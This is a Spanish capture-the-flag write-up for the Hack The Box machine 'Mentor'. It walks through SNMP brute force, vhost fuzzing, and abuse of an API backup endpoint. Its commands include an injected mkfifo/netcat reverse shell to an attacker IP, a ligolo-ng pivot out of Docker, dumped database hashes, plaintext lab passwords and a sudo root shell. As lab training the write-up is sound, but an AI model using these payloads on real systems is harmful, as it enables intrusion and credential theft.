# Mentor

![](../../../../~gitbook/image.md)Publicado: 23 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
### 📝 Descripción
Mentor es una máquina Linux de dificultad media que presenta múltiples vectores de ataque y técnicas de enumeración. La máquina aloja una aplicación web Flask que permite a los usuarios escribir citas motivadoras, complementada con una API REST documentada.La explotación inicial requiere una enumeración exhaustiva que incluye el descubrimiento de servicios SNMP en el puerto 161/UDP, donde mediante fuerza bruta se obtienen credenciales válidas almacenadas en strings de comunidad. Paralelamente, el fuzzing de virtual hosts revela un subdominio API (`api.mentorquotes.htb`) que expone endpoints administrativos protegidos por autenticación JWT.El vector de ataque principal involucra la autenticación en la API utilizando credenciales obtenidas via SNMP, seguido del abuso de una funcionalidad de backup vulnerable a inyección de comandos. Esta vulnerabilidad permite ejecutar código remoto y obtener acceso inicial al sistema, aunque se descubre que el acceso es a un contenedor Docker.La escalada de privilegios requiere técnicas de pivoting mediante port forwarding (utilizando ligolo-ng) para acceder a una base de datos PostgreSQL interna. Las credenciales extraídas de la base de datos permiten el acceso SSH al host real, y la escalada final se logra mediante el descubrimiento de credenciales adicionales en archivos de configuración SNMP y el abuso de permisos sudo mal configurados.Vectores de ataque principales:- Enumeración SNMP y fuerza bruta de community strings
- Fuzzing de virtual hosts y descubrimiento de APIs
- Inyección de comandos en endpoint de backup
- Pivoting desde contenedor Docker al host principal
- Escalada mediante credenciales en archivos de configuración
- Abuso de permisos sudo

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos TCP

#### Enumeración de servicios

#### Escaneo de puertos UDP
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
#### 161 SNMP (UDP)
En primer lugar podemos hacer fuerza bruta para descubrir distintos strings de comunidades![](../../../../~gitbook/image.md)Nos genera un fichero bastante extenso con todas las strings pero tras una enumeración profunda descubrimos algo que podría sernos útil y que podría ser una credencial porque se está usando con un script en python llamado login.py:![](../../../../~gitbook/image.md)
### 🌐 Enumeración Web

#### 80 HTTP
Enumerando el servicio web del puerto 80 de forma manual, no vemos gran cosa aparte de un portal donde los usuarios escriben citas motivadoras:![](../../../../~gitbook/image.md)Enumeramos las tecnologías usando wappalyzer y vemos que está construida con python 3 y Flask:![](../../../../~gitbook/image.md)Interceptamos la petición con Burpsuite y encontramos en la respuesta que el server es Werkzeug 2.0.3![](../../../../~gitbook/image.md)
#### Fuzzing de directorios (mentorquotes.htb)
No hallamos ningún recurso realizando fuzzing de directorios con gobuster y feroxbuster.
#### Fuzzing de vhosts (mentorquotes.htb)
Durante la realización del fuzzing de vhost, es importante destacar que tuve que ajustar el comando usando varios diccionarios y añadiendo finalmente la opción -mc all, la cual fue clave para que obtenga cualquier tipo de código de respuesta:Halló un recureso api con un código de respuesta 404![](../../../../~gitbook/image.md)Añadimos este nuevo vhost `api.mentorquotes.htb` al fichero /etc/hostsVolvemos a realizar fuzzing de directorios sobre el nuevo vhost descubierto:
#### Fuzzing directorios (api.mentorquotes.htb)
![](../../../../~gitbook/image.md)Encontramos varios recursos:http://api.mentorquotes.htb/admin/![](../../../../~gitbook/image.md)http://api.mentorquotes.htb/users/![](../../../../~gitbook/image.md)http://api.mentorquotes.htb/docsUno de los recursos descubiertos contiene documentación sobre la API:http://api.mentorquotes.htb/docs![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Apuntamos este usuario por si pudiese sernos de utilidad.
### 💻 Explotación
Vamos a jugar con la API para ver si podemos encontrar un vector de ataque. Atacamos el endpoint de login usando el usuario que hemos obtenido "james" y usamos como contraseña el valor encontrado en la string de snmp:Vemos que el servicio nos responde con lo que podría ser un token:![](../../../../~gitbook/image.md)Existe otro endpoint /users que requiere de especificar una cadena de autorización para poder usarlo, probemos con el token que hemos obtenido:![](../../../../~gitbook/image.md)Construimos la petición GET con curl especificando el token en la cabecera de autorización y hacemos un pipe de jq para formatear la salida a formato JSON para una mejor visualización de la salida:![[Pasted image 20250523141535.png]]![](../../../../~gitbook/image.md)Por otro lado, si vamos al endpoint /admin e interceptamos la petición con burp y añadimos la cabecera de autorización con el token obtenido:![](../../../../~gitbook/image.md)Vemos en la respuesta que parece que hay un par de funciones de administración:Repetimos la misma operación con cada uno de ellos:/check![](../../../../~gitbook/image.md)Parece que esta función aún no ha sido implementada y nos sirve de utilidad./backup![](../../../../~gitbook/image.md)Esta nos indica que el tipo de petición no está permitida, cambiemos el GET por un POST:![](../../../../~gitbook/image.md)Ahora nos falla porque el servicio espera que le enviemos como parámetro un JSON que tenga esa estructura con un body.Añadimos primeo la cabecera content-type: application/json y metemos un json vacío![](../../../../~gitbook/image.md)Ahora que ya sabemos la estructura que espera el servicio, la pasamos en la llamada:![](../../../../~gitbook/image.md)Vemos que el servicio devuelve un DONE!, por lo que a priori parece haber ido bien.
#### Initial foothold
Podemos abusar de esta petición para intentar ejecutar un RCE . Veamos primero si el parámetro path es vulnerable a inyección de comandosIniciamos la captura de tráfico de protocolo icmpUsamos el siguiente payload mediante el uso del carácter ; para ejecutar la inyección de comandos:Interceptamos la petición ping a nuestro host, luego la inyección funciona y validamos la prueba de concepto.![](../../../../~gitbook/image.md)Iniciamos un listenerVeamos ahora como podría llevar a cabo esto con una shell one liner para llevar a cabo un RCE:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Ganamos acceso a la máquina. Al principio parece que nuestro objetivo es doble, porque somo root, pero pronto nos damos cuenta de que estamos dentro de un contenedor de dockerObtenemos la primera flag en el directorio /home/svc![](../../../../~gitbook/image.md)
#### 👑 Escalada de privilegios
Enumeramos la máquina y descubrimos un archivo db.py en el directorio /app/app:![](../../../../~gitbook/image.md)Para ganar acceso a la base de datos, necesitamos realizar port forwading, en este caso no podemos usar ssh porque no tenemos ninguna clave privada con la que podes conectarnos usando este protocolo, lo haremos usando ligolo-ngDescargamos ligolo tanto el proxy como el clienteDefinimos una interfaz para ligoloLevantamos la interfazIniciamos el proxy en el host de ataqueTransferimos el agente al host destino, le damos permisos de ejecución y lo ejecutamosAhora añadimos un listener para realizar el redireccionamientoA continuación usamos el siguiente comando para conectarnos a la base de datosEl hash está en md5, obtenemos la contraseña:![](../../../../~gitbook/image.md)Ahora nos conectamos a través del protocolo ssh usando el usuario svc y la contraseña obtenida:Escalada a usuario jamesBuscamos ahora la escalada de privilegiosTransferimos la herramienta linpeas.sh al directorio /tmp de la máquina objetivo, le damos permisos de ejecución y ejecutamos.![](../../../../~gitbook/image.md)Revisando el archivo /etc/snmp/snmpd.conf encontramos una credencial:![](../../../../~gitbook/image.md)Escalada a rootNos autenticamos como james usando la contraseña obtenida en el fichero snmpd.conf y logramos escalar a este usuario. A continuación, verificamos si puede ejecutar algún comando como root:En este caso, vemos que james puede ejecutar una shell como root, por lo que la escalada es muy sencilla y basta con hacer lo siguiente:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯ ping -c2 10.10.11.193
PING 10.10.11.193 (10.10.11.193) 56(84) bytes of data.
64 bytes from 10.10.11.193: icmp_seq=1 ttl=63 time=47.3 ms
64 bytes from 10.10.11.193: icmp_seq=2 ttl=63 time=47.4 ms

--- 10.10.11.193 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1007ms
rtt min/avg/max/mdev = 47.284/47.356/47.428/0.072 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.193 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.10.75 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 11:33 CEST
Nmap scan report for 10.10.11.193
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
nmap -sU  -F 10.10.11.193

Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.072s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```

```
echo "10.10.11.193 mentorquotes.htb" | sudo tee -a /etc/hosts
```

```
wget https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/refs/heads/master/snmpbrute.py
```

```
snmpbrute -t 10.10.11.193
```

```
command: snmpwalk -c [community name] -v [version] [IP]

snmpwalk -c internal -v2c 10.10.11.193 > snmp_10.10.11.193.txt
```

```
ffuf -u http://10.10.11.193 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -mc all
```

```
curl -s -X POST 'http://api.mentorquotes.htb/auth/login' \
-d '{"email":"james@mentorquotes.htb", "username": "james", "password":"kj23sadkj123as0-d213"}' \
-H 'Content-Type: application/json'
```

```
curl -X GET http://api.mentorquotes.htb/users/ -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" | jq
```

```
{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}}
```

```
sudo tcpdump -i tun0 icmp
```

```
/etc/passwd;ping -c2 10.10.14.8;
```

```
nc -nlvp 1234
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
```

```
"/etc/passwd; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f;"
```

```
https://github.com/Nicocha30/ligolo-ng
```

```
sudo ip tuntap add user $USER mode tun ligolo
```

```
sudo ip link set ligolo up
```

```
./proxy selfcert
```

```
./agent -connect 10.10.14.8:11601 -ignore-cert
```

```
listener_add --addr 0.0.0.0:5432 --to 127.0.0.1:5432
```

```
psql -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres

Password for user postgres:
psql (14.5 (Debian 14.5-1), server 13.7 (13.7-1.pgdg110+1))
Type "help" for help.

mentorquotes_db=# SELECT * FROM users;
id |           email            |   username   |               password
----+----------------------------+--------------+--------------------------------------
1 | james@mentorquotes.htb    | james        | 7ccdc... (truncado)
2 | svc@mentorquotes.htb      | service_acc  | 53f22d0dfa10dce7e29cd31f4f953fd8
```

```
ssh svc@10.10.11.193
123meunomeeivani
```

```
svc@mentor:/tmp$ ./linpeas.sh
```

```

su james
SuperSecurePassword123___

james@mentor:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on mentor:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User james may run the following commands on mentor:
(ALL) /bin/sh
james@mentor:~$
```

```
james@mentor:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
```
